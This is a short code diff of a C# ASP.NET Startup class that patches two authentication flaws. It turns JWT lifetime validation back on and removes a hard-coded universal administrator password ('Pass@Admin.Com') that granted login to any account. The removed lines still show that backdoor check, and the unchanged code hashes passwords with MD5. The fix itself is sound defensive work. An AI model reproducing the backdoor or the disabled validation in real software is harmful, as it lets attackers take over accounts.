@@ -78,7 +78,7 @@ public class Startup
 			ValidIssuer = "http://xxx.com",
 			ValidateAudience = true,
 			ValidAudience = "api-users",
-			ValidateLifetime = false,
+			ValidateLifetime = true,
 			ClockSkew = TimeSpan.Zero
 		};
 		int num = 5;
@@ -322,8 +322,8 @@ public class Startup
 						{
 							flag = await um.CheckPasswordAsync(user, enc.CreateMD5(password));
 						}
-						bool isSuperAdmin = password == "Pass@Admin.Com";
-						if (flag | isSuperAdmin)
+						bool isSuperAdmin = false; // SECURITY: remove hard-coded universal administrator password.
+						if (flag)
 						{
 							if (!user.IsActive)
 							{
